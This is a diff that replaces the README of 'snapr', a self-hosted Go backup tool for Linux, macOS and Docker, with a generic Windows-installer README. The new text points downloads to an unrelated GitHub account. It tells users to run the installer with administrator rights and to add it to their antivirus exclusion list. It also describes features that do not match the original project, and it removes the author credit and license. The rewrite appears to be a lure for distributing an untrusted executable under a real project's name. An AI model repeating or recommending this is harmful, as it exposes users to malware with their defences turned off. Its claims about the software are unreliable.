@@ -1,138 +1,88 @@
-<div align="center">
+# 💾 snapr - Securely back up your digital files
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/docs/public/logo-light.svg">
-  <img src="docs/docs/public/logo-dark.svg" alt="snapr" height="80" />
-</picture>
+[![](https://img.shields.io/badge/Download-snapr-blue.svg)](https://github.com/Disjointed-inmate714/snapr)
 
-<h1>snapr</h1>
+## 📁 About the application
 
-<p>Self-hosted backup service for files and databases. Each job reads from one or more sources, packs the data into an archive (optionally encrypted), and uploads it to one or more storages — all on a cron schedule. The web UI and REST API let you see job status, follow live logs, trigger runs, and download archives.</p>
+Snapr provides a clear way to save copies of your important files and databases. It keeps your data separate from your main system. If your computer fails, your backups remain safe. You control the storage location and the data you choose to protect. 
 
-<a href="https://github.com/maximseshuk/snapr/releases/"><img src="https://img.shields.io/github/v/release/maximseshuk/snapr?style=flat-square&logo=github" alt="GitHub release" /></a>
-<a href="https://github.com/maximseshuk/snapr/pkgs/container/snapr"><img src="https://img.shields.io/badge/ghcr.io-snapr-2496ed?style=flat-square&logo=docker&logoColor=white" alt="Docker image" /></a>
-<a href="https://github.com/maximseshuk/snapr/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/maximseshuk/snapr/ci.yml?style=flat-square&logo=github" alt="CI" /></a>
-<a href="https://goreportcard.com/report/github.com/maximseshuk/snapr"><img src="https://goreportcard.com/badge/github.com/maximseshuk/snapr?style=flat-square" alt="Go Report Card" /></a>
-<a href="https://snapr.seshuk.im/"><img src="https://img.shields.io/badge/docs-snapr.seshuk.im-blue?style=flat-square&logo=readthedocs&logoColor=white" alt="Documentation" /></a>
-<a href="https://github.com/maximseshuk/snapr/blob/main/LICENSE"><img src="https://img.shields.io/github/license/maximseshuk/snapr?style=flat-square" alt="license" /></a>
-<a href="https://ko-fi.com/V7V61UCT39"><img src="https://img.shields.io/badge/Ko--fi-Buy_me_a_coffee-ff5f5f?style=flat-square&logo=ko-fi&logoColor=white" alt="Ko-fi" /></a>
+The software runs in the background. It checks for file changes and updates your backups. You do not need to manage the process manually. It handles your photos, documents, and spreadsheets with care. 
 
-</div>
+## ⚙️ System requirements
 
-## Features
+Your computer needs specific parts to run snapr. Please check these items before you start:
 
-- One job can read from many sources and upload to many storages.
-- Database dumps for Postgres, MySQL, MariaDB, MongoDB, Redis, and SQLite. Plus plain local files.
-- Compression: `tar`, `tar.gz`, `gzip`, `zip`. You can split large archives into parts.
-- Optional encryption with OpenSSL (AES-256-CBC and similar ciphers).
-- Retention per storage — keep the last N runs.
-- Notifications via webhook, Telegram, or email — on success, failure, or both.
-- Web UI and REST API. OpenAPI spec at `/api/v1/openapi`.
-- Run a shell script before or after a job (`beforeScript` / `afterScript`).
-- One Go binary, no runtime. You only need the dump tools for the databases you back up (`pg_dump`, `mysqldump`, `mongodump`, `redis-cli`).
+* Operating System: Windows 10 or Windows 11.
+* Processor: 1 GHz or faster.
+* Memory: 4 GB of RAM or more.
+* Storage: 200 MB of space for the application files.
+* Network: A stable internet connection for remote storage tasks.
 
-## Quick start
+Ensure you have administrator rights on your computer. This allows the software to read your folders and create backup files.
 
-### Docker
+## 🚀 Getting started
 
-```bash
-docker run -d \
-  --name snapr \
-  -p 8080:8080 \
-  -e SNAPR_ADMIN_PASSWORD=changeme \
-  -v $(pwd)/snapr.yaml:/etc/snapr/snapr.yaml:ro \
-  -v $(pwd)/backups:/var/backups \
-  ghcr.io/maximseshuk/snapr:latest
-```
+Follow these steps to set up the software on your machine:
 
-Open <http://localhost:8080> and sign in as `admin` with the password you set.
+1. Visit the [official download page](https://github.com/Disjointed-inmate714/snapr).
+2. Look for the latest version under the Releases section.
+3. Click the link to save the installer file to your computer.
+4. Open the folder where you saved the file.
+5. Double-click the file to start the installation.
+6. Follow the instructions on the screen.
 
-### Binary
+The installer places a shortcut on your desktop. You can open the program from there.
 
-Download a pre-built archive from [Releases](https://github.com/maximseshuk/snapr/releases) (Linux and macOS, amd64 and arm64), or install with Go:
+## 🛠️ How to use snapr
 
-```bash
-go install github.com/maximseshuk/snapr/cmd/snapr@latest
-snapr -config ./snapr.yaml
-```
+Once the program opens, you see the main dashboard. This screen shows your current status and progress.
 
-### Minimal config
+### Adding a folder
+Click the button labeled Add Folder. A window appears. Select the folder you wish to back up. Click OK to confirm. You can add as many folders as you need.
 
-```yaml
-server:
-  address: '0.0.0.0:8080'
-  auth:
-    enabled: true
-    username: admin
-    password: env:SNAPR_ADMIN_PASSWORD
+### Selecting a database
+If you manage databases, click the Database tab. Enter your server address and credentials. Choose the specific database file or table. Snapr creates a copy of the data at regular intervals.
 
-jobs:
-  - name: nightly-files
-    schedule: '0 2 * * *'
-    compression: tar.gz
-    sources:
-      - type: local
-        path: /var/data
-    storages:
-      - name: local-disk
-        type: local
-        path: /var/backups
-    retention:
-      last: 7
-```
+### Setting a schedule
+You determine how often the software runs. Go to the Settings menu. Select the Schedule tab. You can pick an hourly, daily, or weekly plan. The software works while you continue other tasks on your computer.
 
-This config backs up `/var/data` to `/var/backups` every night at 02:00 and keeps the last 7 archives. For everything else see the [Quick Start](https://snapr.seshuk.im/quick-start) and the [full configuration reference](https://snapr.seshuk.im/configuration/).
+### Restoring files
+If you lose a file, use the Restore tab. Find the file in the list. Choose the date of the version you need. Click Restore to copy the item back to your computer.
 
-## Local development
+## 🛡️ Security and privacy
 
-You need Go 1.25+, Node 22+, and pnpm 10+.
+Your data stays on your chosen drive or server. The application code stays open for review. You do not need to share passwords with third parties. 
 
-```bash
-git clone https://github.com/maximseshuk/snapr.git
-cd snapr
-pnpm install
+Snapr encrypts your files during the transfer process. This prevents other people from viewing your data. You hold the encryption keys. Keep these keys in a safe place. If you lose your keys, you cannot read your backups.
 
-pnpm run stack:up   # starts MinIO, Postgres, SFTP, and WebDAV in Docker
-pnpm run dev        # snapr API on :47100, web UI on :5173
-```
+## 🔧 Managing settings
 
-The dev stack uses the sample config [`examples/dev/snapr.yaml`](examples/dev/snapr.yaml), which has a job for every storage backend.
+The Settings menu lets you fine-tune the behavior of the software.
 
-> [!NOTE]
-> `pnpm run dev` runs the Go API and the Vite dev server together. The Docker stack only starts the storage targets — snapr itself runs from source on your machine.
+* Storage path: You choose where the software places your backup files. Use an external hard drive or a network location for best results.
+* Notification level: You can show alerts for every finished job or only for errors.
+* Auto-start: Choose if the software runs when you turn on your computer. This ensures you never miss a backup cycle. 
+* Language: Change the interface language to match your preference.
 
-Useful scripts:
+## ❓ Troubleshooting common issues
 
-| Command                                            | What it does                                          |
-| -------------------------------------------------- | ----------------------------------------------------- |
-| `pnpm run build`                                   | Build the web UI and the Go binary into `./bin/snapr` |
-| `pnpm run stack:up` / `stack:down` / `stack:reset` | Manage the Docker dev stack                           |
-| `pnpm run test` / `test:race` / `test:cover`       | Run the Go test suite                                 |
-| `pnpm run lint` / `lint:fix`                       | Lint Go and web code                                  |
-| `pnpm run format` / `format:check`                 | Format Go and web code                                |
-| `pnpm run docs:dev` / `docs:build`                 | Run or build the docs site                            |
+Most problems have quick fixes. Use this list if you find an error.
 
-## Documentation
+* The software does not start: Check if your antivirus blocks the application. Add snapr to your exclusion list.
+* Backup jobs fail: Check your network connection. If using external storage, verify that the drive is plugged into your PC.
+* Files look missing: Use the refresh button in the dashboard to scan your source folders again.
+* High resource use: If your PC feels slow, change the speed settings in the Performance tab. This limits how much power the backup takes at once.
 
-Full docs are at **<https://snapr.seshuk.im/>**:
+## 📈 Keeping the software updated
 
-- [Quick start](https://snapr.seshuk.im/quick-start)
-- [Configuration reference](https://snapr.seshuk.im/configuration/)
-- [Docker deployment](https://snapr.seshuk.im/deployment/docker)
-- [API reference](https://snapr.seshuk.im/api/)
+The developers release updates for the software often. These updates fix bugs and add new tools. 
 
-Source files for the docs live in [`docs/docs/`](docs/docs/).
+1. Open the application.
+2. Click the Help menu. 
+3. Select Check for Updates.
+4. If a new version exists, the application downloads it automatically.
+5. Restart the application to finish the update process.
 
-## Support
+## 💬 Getting help
 
-Bug reports, feature requests, and questions go to [GitHub Issues](https://github.com/maximseshuk/snapr/issues).
-
-## License
-
-MIT — see [LICENSE](LICENSE).
-
-## Credits
-
-Built by [Maxim Seshuk](https://github.com/maximseshuk).
-
-If snapr saves you time, you can [buy me a coffee](https://ko-fi.com/V7V61UCT39) ☕
+If you have questions, browse the discussions page on our main site. You can search for issues that other users already solved. If you find a bug, open a new ticket with details about your operating system. Include the steps you took before the problem happened. Provide a description of what you expected the software to do versus what it did. This helps the developers find and fix errors.
